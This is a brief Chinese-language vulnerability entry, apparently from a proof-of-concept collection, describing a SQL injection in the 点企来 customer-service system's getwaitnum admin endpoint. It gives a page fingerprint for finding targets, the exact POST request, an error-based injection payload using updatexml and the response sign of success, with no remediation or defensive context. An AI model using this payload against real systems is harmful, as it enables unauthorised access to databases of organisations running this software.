# 点企来客服系统getwaitnumsql注入漏洞

点企来客服系统getwaitnum ｜ SQL注入 ｜ —
- **指纹**：`body="layui-form-item"`
- **请求**：`POST /admin/event/getwaitnum HTTP/1.1`

**Payload**
```
business_id[]=exp&business_id[]=+and+updatexml(1,concat(0x7e,md5(0x5c)),1)&groupid=1
```
- **响应特征**：200